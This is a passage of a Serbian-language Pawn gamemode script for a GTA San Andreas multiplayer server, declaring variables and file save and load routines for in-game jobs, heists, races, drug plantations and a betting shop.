    INI_Int("Pokvareno", BitcoinInfo[id][bPokvareno]);
    return 1;
}

SacuvajBTCWorkShop(id)
{
    new fFile[128];
    format(fFile, 128, BITCOIN_FILE, id);
    new INI:File = INI_Open(fFile);
    
    INI_WriteString(File, "Vlasnik", BitcoinInfo[id][bVlasnik]);
    INI_WriteInt(File, "Novac", BitcoinInfo[id][bNovac]);
    INI_WriteInt(File, "Masine", BitcoinInfo[id][bMasine]);
    INI_WriteFloat(File, "UlazX", BitcoinInfo[id][bUlazX]);
    INI_WriteFloat(File, "UlazY", BitcoinInfo[id][bUlazY]);
    INI_WriteFloat(File, "UlazZ", BitcoinInfo[id][bUlazZ]);
    INI_WriteFloat(File, "IzlazX", BitcoinInfo[id][bIzlazX]);
    INI_WriteFloat(File, "IzlazY", BitcoinInfo[id][bIzlazY]);
    INI_WriteFloat(File, "IzlazZ", BitcoinInfo[id][bIzlazZ]);
    INI_WriteInt(File, "Pokvareno", BitcoinInfo[id][bPokvareno]);

    INI_Close(File);
    return 1;
}

BitCoinLP(id)
{
    DestroyDynamic3DTextLabel(BitCoinLabel[id]);
    DestroyDynamicPickup(BitCoinPickup[id]);
    DestroyDynamic3DTextLabel(BitCoinSafeLabel[id]);
    new fFile[80], string[220];
    format(fFile, 80, BITCOIN_FILE, id);

    if(strcmp( BitcoinInfo[id][bVlasnik], "Niko", true )) {

        format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"%s\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Klikni F za ulaz", BitcoinInfo[id][bVlasnik], id);
        BitCoinLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
        BitCoinPickup[id] = CreateDynamicPickup(1272, 1, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

        BitCoinSafeLabel[id] = CreateDynamic3DTextLabel(""SRVBOJA1SCM"Da pristupite BitCoin Serveru\n"col_white"[ /btcserver ]", 0x33CCFFAA, 2294.5474,-1786.3489,1600.7520, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, id, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);

    }
    else if(!strcmp( BitcoinInfo[id][bVlasnik], "Niko", true )) {

        format(string, 220, ""SRVBOJA1SCM"[ BitCoin WorkShop ]\nVlasnik : "col_white"NIKO\n"SRVBOJA1SCM"ID: "col_white"%d\n"SRVBOJA1SCM"Cena: "col_white"%d$\n"SRVBOJA1SCM"Da kupis bitcoin workshop koristi /kupiworkshop", id, BTCWORKSHOP_PRICE);
        BitCoinLabel[id] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, STREAMER_3D_TEXT_LABEL_SD, -1, 0);
        BitCoinPickup[id] = CreateDynamicPickup(18631, 1, BitcoinInfo[id][bUlazX], BitcoinInfo[id][bUlazY], BitcoinInfo[id][bUlazZ], -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);
    }
}

////////////////////////////////////
new Float:BiljkePozicije[51][3] = {

    {-2767.0027,-1352.5924,134.1382},
    {-2779.4934,-1355.2678,133.5413},
    {-2793.8518,-1353.8898,132.2624},
    {-2805.1711,-1354.2681,131.4575},
    {-2819.5752,-1355.9097,130.2873},
    {-2822.9126,-1368.4120,131.5566},
    {-2806.5315,-1379.5204,133.9505},
    {-2794.2737,-1382.1969,134.8242},
    {-2778.4775,-1390.8845,135.8815},
    {-2770.9333,-1406.4510,136.5414},
    {-2793.4719,-1415.2925,136.5343},
    {-2814.0713,-1423.2382,136.5994},
    {-2832.8274,-1429.4006,136.4883},
    {-2851.2688,-1439.6033,136.5178},
    {-2854.6721,-1455.1938,136.1142},
    {-2838.0063,-1459.0441,135.9219},
    {-2822.5491,-1462.4187,136.0168},
    {-2802.3538,-1466.8276,137.3770},
    {-2785.4941,-1474.8865,137.4699},
    {-2794.2871,-1490.8740,138.4868},
    {-2834.9534,-1488.5194,137.7494},
    {-2851.9507,-1493.1487,136.9462},
    {-2865.9866,-1507.2452,137.2482},
    {-2848.0017,-1518.3324,138.2845},
    {-2862.8069,-1533.1282,138.6519},
    {-2863.1567,-1552.5653,140.0031},
    {-2840.2119,-1554.4261,140.4096},
    {-2825.5505,-1569.9404,141.3203},
    {-2840.7122,-1584.4409,141.3203},
    {-2848.6919,-1601.1447,141.3203},
    {-2831.7373,-1614.7830,141.4259},
    {-2816.7751,-1618.1747,141.4565},
    {-2800.5642,-1621.6194,141.4656},
    {-2784.3691,-1635.7429,141.4881},
    {-2781.6729,-1653.2168,141.5324},
    {-2795.9539,-1659.5618,141.5229},
    {-2812.9199,-1671.5549,141.5234},
    {-2830.2527,-1685.8915,141.5234},
    {-2830.1921,-1702.7694,141.5574},
    {-2810.5623,-1707.1547,141.6214},
    {-2792.0183,-1711.0972,141.6903},
    {-2790.8564,-1725.6541,141.7228},
    {-2804.1555,-1734.3010,141.6664},
    {-2817.8806,-1743.1693,141.6111},
    {-2830.9099,-1751.8462,141.5529},
    {-2825.5188,-1770.6980,141.5592},
    {-2809.5073,-1773.3489,140.8038},
    {-2787.7561,-1785.6074,141.1422},
    {-2799.5461,-1794.9526,140.3420},
    {-2811.5520,-1808.1952,138.6685},
    {-2782.1765,-1818.2183,138.0304}
};

new PlantNumber[20];
new PlantObj[20];
new Text3D:PlantLabel[20];

new bool:KokainTorba[MAX_PLAYERS];

new TrenutniKokain[MAX_PLAYERS];

////////////////////////////////////

new PucanjeGumeBrojac[MAX_PLAYERS];

////////////////////////////////////
new KranObjekat;
new bool:VoziKombi[MAX_PLAYERS];
new KutijaAttach[3];
new Viljuskar[2];
new Kontenjeri[3];
new BrojKontenjera = 0;
new bool:KranUpotreba = false;
new bool:KoristiKran[MAX_PLAYERS];
new bool:KranSpustanje = false;
new bool:KranSpustanje2 = false;
new bool:KranSpustaKutiju = false;
new KranPozicija;
new KranRuka;
new KranKutija;
new KombiMats = -1;
new KombiMatsPaketi = 0;
new bool:NosiKutijuMats[MAX_PLAYERS];
new NosiBrojMats[MAX_PLAYERS];

////////////////////////////////////
new LiftMuzej[4];
new MuzejSlika;
new bool:MuzejPokrenut;
new bool:LiftDole;
new Text3D:SlikaLabel;
new bool:SlikaKreirana;
new bool:NosiSliku[MAX_PLAYERS];
new MuzejKrajVreme;
new MuzejSlikaPickup;
new Text:MuzejTimerTD[4];
new bool:OdnetaSlika;
///////////////////////////////////

// new Text3D:AdminVehLabel[MAX_PLAYERS];

new ItemUseTimer[MAX_PLAYERS];
new ItemUseMedKit[MAX_PLAYERS];

new bool:NosiPaket[MAX_PLAYERS];
new PaketPickup;
new bool:StvorenPaket;

new KombiPrevoz;
new bool:KombiKreiran;

new bool:UslikanSkoro[MAX_PLAYERS];
new bool:PostavioRadar[MAX_PLAYERS];
new RadarObjekat[MAX_PLAYERS];

new bool:FlashTime[MAX_PLAYERS];
new bool:ActiveFlash[MAX_PLAYERS];
new PlayerText:BeliTD[MAX_PLAYERS];

//Moler Varijable
new MolerZid[8][MAX_PLAYERS];
new bool:RadiMoler[MAX_PLAYERS];
new MolerCP[MAX_PLAYERS];

new Float:BribePozicije[10][4] = {

    {1073.1073,-889.1536,43.3932,92.8877},
    {1120.6976,-1245.1088,16.0584,88.4044},
    {841.0832,-1342.1187,7.1719,112.1719},
    {862.0043,-1095.7960,24.2969,177.4342},
    {387.3147,-2033.7178,7.8359,90.6637},
    {1377.7903,-1626.3654,13.5469,169.5140},
    {2068.7732,-1588.9615,13.4913,274.8944},
    {1959.9302,-1375.7272,18.5781,256.2223},
    {2226.8818,-1194.3881,25.3170,187.2442},
    {2449.0718,-1889.8359,13.5534,38.5414}
};
new BribeTrenutni;
new BribeActor;
new Text3D:BribeLabel;

////////////////////////////////////////////////////////////////////////////////
new ImenaVozila[212][] =
{
    {"Landstalker"},{"Bravura"},{"Buffalo"},{"Linerunner"},{"Perrenial"},{"Sentinel"}, {"Dumper"},{"Firetruck"},
    {"Trashmaster"},{"Stretch"},{"Manana"},{"Infernus"},{"Voodoo"},{"Pony"},{"Mule"},{"Cheetah"},{"Ambulance"},
    {"Leviathan"},{"Moonbeam"},{"Esperanto"},{"Taxi"}, {"Washington"},{"Bobcat"},{"Whoopee"},{"BF-INJ"},{"Hunter"},
    {"Premier"},{"Enforcer"},{"Securicar"},{"Banshee"},{"Predator"},{"Bus"},{"Rhino"},{"Barracks"},{"Hotknife"},
    {"Article TR"},{"Previon"},{"Coach"},{"Cabbie"},{"Stallion"},{"Rumpo"},{"RC Bandit"},{"Romero"},{"Packer"},
    {"Monster"}, {"Admiral"},{"Squalo"},{"Seasparrow"},{"Pizzaboy"},{"Tram"},{"Article TR2"},{"Turismo"},{"Speeder"},
    {"Reefer"},{"Tropic"},{"Flatbed"},{"Yankee"},{"Caddy"},{"Solair"},{"Berkley's RC"},{"Skimmer"},{"PCJ-600"},
    {"Faggio"},{"Freeway"},{"RC Baron"},{"RC Raider"},{"Glendale"},{"Oceanic"},{"Sanchez"}, {"Sparrow"},{"Patriot"},
    {"Quad"},{"Coastguard"},{"Dinghy"},{"Hermes"},{"Sabre"},{"Rustler"},{"ZR-350"},{"Walton"},{"Regina"},{"Comet"},
    {"BMX"},{"Burrito"},{"Camper"},{"Marquis"},{"Baggage"},{"Dozer"},{"Maverick"},{"Chopper"},{"Rancher"},{"FBI - Ra"},
    {"Virgo"},{"Greenwood"},{"Jetmax"},{"Hotring"}, {"Sandking"},{"Blista Compact"},{"Maverick"},
    {"Boxville"},{"Benson"},{"Mesa"},{"RC Goblin"},{"HR - A"},{"HR - B"},{"Bloodring Banger"},{"Rancher"},{"Super GT"},
    {"Elegant"},{"Journey"},{"Bike"},{"Bike"},{"Beagle"},{"Cropdust"},{"Stuntplane"},{"Tanker"},{"Roadtrain"},
    {"Nebula"},{"Majestic"},{"Buccaneer"},{"Shamal"},{"Hydra"},{"FCR-900"},{"NRG-500"},{"HPV1000"},{"Cement Truck"},
    {"Tow Truck"},{"Fortune"},{"Cadrona"},{"FBI Truck"},{"Willard"},{"Forklift"},{"Tractor"},{"Combine"},{"Feltzer"},
    {"Remington"},{"Slamvan"},{"Blade"},{"Freight"},{"Streak"},{"Vortex"},{"Vincent"},{"Bullet"},{"Clover"},{"Sadler"},
    {"Firetruck LA"},{"Hustler"},{"Intruder"},{"Primo"},{"Cargobob"},{"Tampa"},{"Sunrise"},{"Merit"},{"Utility"},
    {"Nevada"},{"Yosemite"},{"Windsor"},{"Monster A"},{"Monster B"},{"Uranus"},{"Jester"},{"Sultan"},{"Stratum"},
    {"Elegy"},{"Raindance"},{"RC Tiger"},{"Flash"},{"Tahoma"},{"Savanna"},{"Bandito"},{"Freight Flat"},
    {"Streak Carriage"},{"Kart"},{"Mower"},{"Dunerider"},{"Sweeper"},{"Broadway"},{"Tornado"},{"AT-400"},{"DFT-30"},
    {"Huntley"},{"Stafford"},{"BF-400"},{"Newsvan"},{"Tug"},{"Article Trailer 3"},{"Emperor"},{"Wayfarer"},{"Euros"},
    {"Mobile Hotdog"}, {"Club"},{"Carriage"},{"Trailer 3"},{"Andromada"},{"Dodo"},{"RC Cam"},{"Launch"},{"Police"},
    {"Police"},{"Police"},{"LSDP-Ranger"},{"Picador"},{"SWAT Van"},{"Alpha"},{"Phoenix"},{"Glendale"},{"Sadler"},
    {"Luggage TR A"},{"Luggage TR B"},{"Stair Trailer"},{"Boxville"},{"Farm Plow"},{"Utility TR"}
};

//==================================[ V01D Register ]===========================

new MuskiSkinoviImena[][] = { "Turista", "Belac sa kapuljacom", "Crnac", "Beskucnik" };
new MuskiSkinoviID[][] = { 26, 29, 28, 137 };

new ZenskiSkinoviImena[][] = { "Bogata zena", "Ulicna devojka", "Poslovna zena", "Belkinja u suknji" };
new ZenskiSkinoviID[][] = { 12, 13, 141, 169 };

//==================================[ Igraci ]==================================

#define OBJECT_SLOT_MASKSUNGL              								       0
#define OBJECT_SLOT_HEAD 		            								   1
#define OBJECT_SLOT_BANDANA                 								   2
#define OBJECT_SLOT_RHAND                 								       3
#define OBJECT_NOSI                 								           4
#define OBJECT_SLOT_LHAND                 								       5
#define OBJECT_SLOT_HELMET                								       6
#define OBJECT_SLOT_MASK                								       7
#define OBJECT_SLOT_BADGE                								       8
#define OBJECT_SLOT_BACKPACK                               	  	 	 	 	   9

#define POSAO_NEMA                  								       	   0
#define POSAO_KOSAC 														   1
#define POSAO_RUDAR														       2
#define POSAO_DILER															   3
#define POSAO_VOJNIK														   4
#define POSAO_DELIVERY                                                         5
#define POSAO_SABOTAZER                                                        6
#define POSAO_MOLER                                                            7
#define POSAO_HAKER                                                            8
#define POSAO_LOVAC                                                            9
#define POSAO_PORNO                                                            10
#define POSAO_ASTRONAUT                                                        11
#define POSAO_DRVA                                                             12
#define POSAO_PILOT                                                            13
#define POSAO_ELEKTRIK                                                         14

#define MAX_JOBS    15

new posaoPickup[MAX_JOBS];

enum _jobsInfos {
	jName[ 64 ],
	Float:jPos[ 3 ],
	jType,
    Float:jUniforma[3]
};

new jobsInfos[ MAX_JOBS ][ _jobsInfos ] = {
    {"Nema", {0.0, 0.0, 0.0}, POSAO_NEMA, {0.0, 0.0, 0.0}},
	{"Kosac", {1963.0918, -1191.3207, 19.3624}, POSAO_KOSAC, {1959.0886,-1187.2491, 19.3656}},
	{"Rudar", {590.3492, 875.4081, -42.496}, POSAO_RUDAR, {964.3640, 392.4265, -33.1746}},
	{"Diler Droge", {-1107.9172,-1642.2211,76.3672}, POSAO_DILER, {0.0, 0.0, 0.0}},
	{"Vojnik", {415.5312,2531.2263,19.1704}, POSAO_VOJNIK, {0.0, 0.0, 0.0}},
    {"Delivery", {-65.0408,-1574.1857,2.6107}, POSAO_DELIVERY, {0.0, 0.0, 0.0}},
    {"Sabotazer", {-2628.8132,1427.1543,7.0938}, POSAO_SABOTAZER, {-2635.5066,1429.5704,7.0938}},
    {"Moler", {-1685.6660,1035.8398,45.2109}, POSAO_MOLER, {-1690.1469,1037.2739,45.2109}},
    {"Hacker", {982.8841,-1521.7328,2200.7690}, POSAO_HAKER, {979.6943,-1521.3632,2200.7690}},
    {"Lovac", {-363.8186,-1414.6986,25.7266}, POSAO_LOVAC, {-369.7953,-1414.6018,25.7266}},
    {"Porno Glumica", {786.9728,-1336.0620,710.2907}, POSAO_PORNO, {787.0922,-1332.5295,710.2907}},
    {"Astronaut", {204.0843,1807.6820,17.6237}, POSAO_ASTRONAUT, {186.4256,1807.9363,17.6237}},
    {"Prevoznik Drva", {1102.7148,-326.4423,73.9950}, POSAO_DRVA, {1105.0785,-313.2471,73.9950}},
    {"Pilot", {3508.0564,-926.8244,11.1153}, POSAO_PILOT, {3505.1226,-932.6504,11.1153}},
    {"Elektricar", {1994.7133,-2022.9432,13.5750}, POSAO_ELEKTRIK, {2000.7933,-2011.9458,13.5750}}
};

new OdabraniIgracPosao[MAX_PLAYERS];

new bool:PosloviCP[MAX_PLAYERS];

new DronVozi[MAX_PLAYERS];  
new DronTime[MAX_PLAYERS];

new bool:RadiDelivery[MAX_PLAYERS];
new DeliveryCP[MAX_PLAYERS];
new DeliveryVozilo[MAX_PLAYERS];


new bool:ProdajeImovinu[MAX_PLAYERS];
//================================== [ Lokali Cene BY V01D ] ============================
//Ovo je define za prazne lokale

new AktivnaIgra[MAX_PLAYERS];

new Timer:VojnikHelisTimer;

new SpamKomandi[MAX_PLAYERS];

//================================== [ VIP Ogranicenja BY V01D ] ===========================

new VipGChat[MAX_PLAYERS];
new VipFix[MAX_PLAYERS];
new VipGoto[MAX_PLAYERS];
new VipMenuTime[MAX_PLAYERS];
new VipFuelTime[MAX_PLAYERS];

//================================== [ Hangar BY V01D ] ===================================

new KombiHangar = -1;
new HangarPaket1;
new HangarPaket2;
new HangarPaket3;

//================================== [ Michael Misija BY V01D ] ===========================

new MichaelMisija1CP[MAX_PLAYERS];
new MichaelMisija1CP2[MAX_PLAYERS];
new MichaelMisija1CP3[MAX_PLAYERS];
//new PandurNPC;
//new MichaelActor2;

//================================== [ Zlatara Vars BY V01D ] =============================

new bool:ZlataraCuvarUpucan = false;
new ZlataraCuvar;
new ZlataraSef;
new ZidZlatara;
new ZlataraSef2;
new bool:ZlataraZidProbijen;
new BusilicaZlatara[7];
new bool:PostaviBusilicuZlatara[MAX_PLAYERS];
new BusilicaTimeZlatara[MAX_PLAYERS];
new ZlataraOrobana;
new ZlataraRobUToku;
new bool:RobaZlataru[MAX_PLAYERS];
new Timer:TimerRobZlatara;
new bool:PokupiTorbuZlatara[MAX_PLAYERS];

new NosiZlataraTorbu[MAX_PLAYERS];

//================================== [ Register Vars BY V01D ] =============================

new bool:UTutorialu[MAX_PLAYERS char];
new PlayerText:TeksticTD[MAX_PLAYERS];
new PlayerText:CrniTD[MAX_PLAYERS];
new TutorialCP[MAX_PLAYERS];
new MichaelActor[MAX_PLAYERS];
new AdvokatActor[MAX_PLAYERS];
new ZatvorenikActor[MAX_PLAYERS];
new PoliceActor[MAX_PLAYERS];
new MichaelPricaVarijabla[MAX_PLAYERS];
new bool:UpucaoPolicajca[MAX_PLAYERS];
new SudjenjePrica[MAX_PLAYERS];

#define TutorialMessage(%0,%1)       SendClientMessage(%0, 0xF81414FF, "(Tutorial) | {FFFFFF}"%1)

//================================== [ Deagle Master VARIJABLE BY V01D ] ============================

new bool:DeagleMasterPokrenut;
new DeagleMasterIgraci;
new bool:DeagleMasterIgra[MAX_PLAYERS];
new bool:DeagleMasterPocinje;

new Iterator:DeagleMasterPlayers<MAX_PLAYERS>;

//================================== [ HOT RUN VARIJABLE BY V01D ] ============================

new bool:HotRunPokrenut;
new HotRunIgraci;
new bool:HotRunIgra[MAX_PLAYERS];
new bool:HotRunPocinje;

new Iterator:HotRunPlayers<MAX_PLAYERS>;

//==================================[ NEKE VARIJABLE BY V01D ]==============================
new UlicneTrkeActor, UlicneTrkeVozilo, UlicneTrkeVozilo2;

//new PDKapija;

new SefActorIntro, BodyGuardActor1, BodyGuardActor2, VoziloTut;

new StartnaLinijaUT;

new UlicneTrkeRaceVeh[MAX_PLAYERS];

new UlicneTrkeVeh[MAX_PLAYERS];
new UlicneTrkeCP[MAX_PLAYERS];
new PocetakTrkaCount[MAX_PLAYERS];
new UlicneTrkeUlog[MAX_PLAYERS];
new UlicneTrkeID[MAX_PLAYERS];

new Timer:ZatvorBegProvera;

new BezanjeZatvor[MAX_PLAYERS];
new BezanjeZatvorVreme[MAX_PLAYERS];
//new Timer:BezanjeZatvorTimer;

new ZatvorActor;
new bool:NosiKutiju[MAX_PLAYERS char];
new bool:PozvaoAdvokata[MAX_PLAYERS char];
new MojAdvokat[MAX_PLAYERS];
new AdvokatPonuda[MAX_PLAYERS];

new DilerPosaoActor;

static BolnicarPosloviCP[MAX_PLAYERS char];
static BolnicarVozilo[MAX_PLAYERS];
static UbacujeTelo[MAX_PLAYERS char];

static bool:IgracLeti[MAX_PLAYERS char];

//==================================[ SABOTAZER VARIJABLE BY V01D ]===================================

static Kapetan1;
static Kapetan2;
static SabotazerActorPosao;
static bool:RadiSabotazer[MAX_PLAYERS char];
static SabotazerPosloviCP[MAX_PLAYERS char];
static PricaSabotazerTimer[MAX_PLAYERS char];
static SabotazerVozilo[MAX_PLAYERS];
static UbioKapetana2[MAX_PLAYERS char];
static UbioKapetana1[MAX_PLAYERS char];
static UpucaKapetana[MAX_PLAYERS char];

//==================================[ VOJNIK VARIJABLE BY V01D ]======================================

new GeneralActor;
new NaucnikActor1;
new EnemyActor1;
new EnemyActor2;
new NaucnikActor;
static bool:RadiVojnik[MAX_PLAYERS char];
static VojnikMisijaJedanCP[MAX_PLAYERS char];
static VojnikMisijaJedanVozilo[MAX_PLAYERS];
static GeneralTimer[MAX_PLAYERS char];
static bool:UzeoOpremuVojnik[MAX_PLAYERS char];
static Vakcina[MAX_PLAYERS];
static KontrolnaTabla;
static bool:UpucaoObjekat[MAX_PLAYERS char];
static bool:TrebaDaPokupiVakcinu[MAX_PLAYERS char];
static bool:TrebaDaUstane[MAX_PLAYERS char];
static bool:UbioActora[MAX_PLAYERS char];
static bool:UbioActora1[MAX_PLAYERS char];
static bool:UbioActora2[MAX_PLAYERS char];
static bool:UbioActora3[MAX_PLAYERS char];
static bool:UpucajNaucnika1[MAX_PLAYERS char];
static bool:UpucajNaucnika2[MAX_PLAYERS char];
static bool:UpucajNeprijatelja1[MAX_PLAYERS char];
static bool:UpucajNeprijatelja2[MAX_PLAYERS char];

static Text:BlackTD;

//==================================[ SMRTNE VARIJABLE by V01D ]================================================

//==================================[ Varijable FunRace by V01D ]=======================================

static FunRacePokrenut;
static bool:FunRacePocinje;
static bool:FunRace[MAX_PLAYERS char];
static FunRaceCP[MAX_PLAYERS char];
static FunRaceVoziloOff[MAX_PLAYERS];
static ZauzetoMesto1;
static ZauzetoMesto2;
static ZauzetoMesto3;
static Kapija;

static Iterator:FunRaceIgraci<MAX_PLAYERS>;

//==================================[ Varijable Rob House by V01D ]=====================================

new RobHouseCount[MAX_PLAYERS];
static Timer:TimerRobHouse;

//==================================[ Varijable Rob Market by V01D ]====================================

static RobMarketKurac[MAX_PLAYERS char];
static Timer:TimerRobMarket;
static PrekinuoRob[MAX_PLAYERS char];
static RobTrafikaKurac[MAX_PLAYERS char];
static Timer:TimerRobTrafika;

//==================================[ Varijable Hunger Games by V01D ]==================================

static kutijeObject[28];
static bool:HungerGame[MAX_PLAYERS char];
static KutijaTimer[MAX_PLAYERS char];
static HungerPokrenut;
static bool:HungerJosMaloPocinje;
static Timer:KutijaTimercic;
static OtvorioMegaKutiju[MAX_PLAYERS char];

static Iterator:HungerGamesIgraci<MAX_PLAYERS>;

//==================================[ DINAMYC ACTORS by V01D ]=========================================
#define ActorsFile   "Aktori/Aktor_%d.ini"

#define MAX_DinActora 300

enum Aktori
{
    Float:aPosX,
    Float:aPosY,
    Float:aPosZ,
    aIme[32],
    aSkin,
    Float:aRot
};

new ActorInfo[MAX_DinActora][Aktori];
new Text3D:ActorLabel[sizeof(ActorInfo)];
new ActorActor[sizeof(ActorInfo)];

forward UcitajActore(idactor, name[], value[]);
public UcitajActore(idactor, name[], value[])
{
    INI_Float("X", ActorInfo[idactor][aPosX]);
    INI_Float("Y", ActorInfo[idactor][aPosY]);
    INI_Float("Z", ActorInfo[idactor][aPosZ]);
    INI_String("Ime", ActorInfo[idactor][aIme], 32);
    INI_Int("Skin", ActorInfo[idactor][aSkin]);
    INI_Float("Rot", ActorInfo[idactor][aRot]);
    return 1;
}

SacuvajDinamicneActore(idactor)
{
    new fFile[128];
    format(fFile, 128, ActorsFile, idactor);
    new INI:File = INI_Open(fFile);

    INI_WriteFloat(File, "X", ActorInfo[idactor][aPosX]);
    INI_WriteFloat(File, "Y", ActorInfo[idactor][aPosY]);
    INI_WriteFloat(File, "Z", ActorInfo[idactor][aPosZ]);
    INI_WriteString(File, "Ime", ActorInfo[idactor][aIme]);
    INI_WriteInt(File, "Skin", ActorInfo[idactor][aSkin]);
    INI_WriteFloat(File, "Rot", ActorInfo[idactor][aRot]);
    INI_Close(File);
    return 1;
}
//==================================[ RENT SYSTEM BY V01D ]============================================

new bool:Rentao[MAX_PLAYERS];
new RentVozilo[MAX_PLAYERS];

#define RENTLOCATION_FILE   "RentLocations/Rent_%d.ini"

#define MAX_RENTL 30

enum RentLokacije
{
    Float:rPosX,
    Float:rPosY,
    Float:rPosZ
};

new RentInfo[MAX_RENTL][RentLokacije];
new RentPickup[sizeof(RentInfo)];
new Text3D:RentLabel[sizeof(RentInfo)];

forward UcitajRentLokacije(idrent, name[], value[]);
public UcitajRentLokacije(idrent, name[], value[])
{
    INI_Float("X", RentInfo[idrent][rPosX]);
    INI_Float("Y", RentInfo[idrent][rPosY]);
    INI_Float("Z", RentInfo[idrent][rPosZ]);
    return 1;
}

SacuvajRentLokacije(idrent)
{
    new fFile[128];
    format(fFile, 128, RENTLOCATION_FILE, idrent);
    new INI:File = INI_Open(fFile);

    INI_WriteFloat(File,"X", RentInfo[idrent][rPosX]);
    INI_WriteFloat(File,"Y", RentInfo[idrent][rPosY]);
    INI_WriteFloat(File,"Z", RentInfo[idrent][rPosZ]);
    INI_Close(File);
    return 1;
}

stock NextRentLocationID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), RENTLOCATION_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

//==================================[ POSAO DILER BY V01D ]============================================

new DilerCheckpoint[MAX_PLAYERS];

#define PLANTAZE_FILE     "PlantazeDrogaPosao/Plant_%d.ini"
#define MAX_PLANTAZA 36

enum DrogaPlantaze
{
	drogaPosadio[MAX_PLAYER_NAME],
	Float:drogaX,
	Float:drogaY,
	Float:drogaZ,
	drogaVreme
};

new PlantazaInfo[MAX_PLANTAZA][DrogaPlantaze];
new Text3D:PlantazaLabel[sizeof(PlantazaInfo)];
new PlantazaObjekat[sizeof(PlantazaInfo)];

forward UcitajPlantazePosao(plant, name[], value[]);
public UcitajPlantazePosao(plant, name[], value[])
{
    INI_String("Posadio", PlantazaInfo[plant][drogaPosadio], 45);
   	INI_Float("DrogaX", PlantazaInfo[plant][drogaX]);
   	INI_Float("DrogaY", PlantazaInfo[plant][drogaY]);
   	INI_Float("DrogaZ", PlantazaInfo[plant][drogaZ]);
   	INI_Int("Vreme", PlantazaInfo[plant][drogaVreme]);
    return 1;
}

SacuvajPlantazu(plant)
{
	new plantFile[40];
    format(plantFile, 40, PLANTAZE_FILE, plant);
    new INI:File = INI_Open(plantFile);
    INI_SetTag(File, "plant");
    INI_WriteString(File,"Posadio", PlantazaInfo[plant][drogaPosadio]);
    INI_WriteFloat(File, "DrogaX", PlantazaInfo[plant][drogaX]);
    INI_WriteFloat(File, "DrogaY", PlantazaInfo[plant][drogaY]);
    INI_WriteFloat(File, "DrogaZ", PlantazaInfo[plant][drogaZ]);
    INI_WriteInt(File, "Vreme", PlantazaInfo[plant][drogaVreme]);
    INI_Close(File);
    return 1;
}

PlantazaLabelUpdate(plant)
{
    DestroyDynamic3DTextLabel(PlantazaLabel[plant]);
    new string[256];
    
    if(strcmp( PlantazaInfo[plant][drogaPosadio], "Niko", true ))
    {
        if(PlantazaInfo[plant][drogaVreme] == 0)
        {
            format(string, sizeof(string), ""col_crvena"[ "col_white"PLANTAZA"col_crvena" ]\nZasadio: "col_white"%s\n"col_crvena"ID: "col_white"%d\n"col_crvena"[ /uberidrogu /ukradidrogu ]", PlantazaInfo[plant][drogaPosadio], plant);
            DestroyObject(PlantazaObjekat[plant]);
            PlantazaObjekat[plant] = CreateObject(824, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ]-1, 0.0, 0.0, 0.0);
        }
        else if(PlantazaInfo[plant][drogaVreme] > 0)
        {
            format(string, sizeof(string), ""col_crvena"[ "col_white"PLANTAZA"col_crvena" ]\nZasadio: "col_white"%s\n"col_crvena"ID: "col_white"%d\n"col_crvena"Nije Sazrelo\nPreostalo : "col_white"%d", PlantazaInfo[plant][drogaPosadio], plant, PlantazaInfo[plant][drogaVreme]);
        }
    }
    else if(!strcmp( PlantazaInfo[plant][drogaPosadio], "Niko", true ))
    {
        format(string, sizeof(string), ""col_green"[ "col_white"PLANTAZA"col_green" ]\nZasadio: "col_white"%s\n"col_green"ID: "col_white"%d"col_green"\n/posadidrogu", PlantazaInfo[plant][drogaPosadio], plant);
        DestroyObject(PlantazaObjekat[plant]);
        PlantazaObjekat[plant] = CreateObject(824, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ]-2.5, 0.0, 0.0, 0.0);
    }
    PlantazaLabel[plant] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    return 1;
}

///////////////////////////////////////// [ V01D VARIJABLE JEBEM KURVE ] //////////////////////////////////////
new DostavljaCement[MAX_PLAYERS];
new UtovarCementa[MAX_PLAYERS];
new Timer:HakovanjeBankaTimer;
new BankHackOdbrojavanje[MAX_PLAYERS];
new HakujeBratina[MAX_PLAYERS];
//============================[ KLADIONICA ]====================================

enum s1cverqw {

    bool:Uplaceno,
    bool:Zavrseno,
    parID[ 10 ],
    teamID1[ 10 ],
    teamID2[ 10 ],
    keciksdva[ 10 ],
    Float:Kvota[ 10 ],
    Uplata,
    Float:Dobitak,
	bool:Status,
	HourPobeda[ 24 ]
};
new KladionicaListic[ MAX_PLAYERS ][ s1cverqw ];
new IzabraniPar[ MAX_PLAYERS ];

#define KLAD_FILE                                  			 "Kladionica/%s.ini"

enum celceeec {

    parID[ 2 ],
    Float:Kvota[ 3 ],
	Rezultat[ 3 ]
};
new Parovi[ 10 ][ celceeec ];

enum celceesec {

    parID[ 2 ],
	Rezultat[ 2 ],
	Float:Kvota,
	HourPobeda[ 24 ]
};
new StariParovi[ 10 ][ celceesec ];

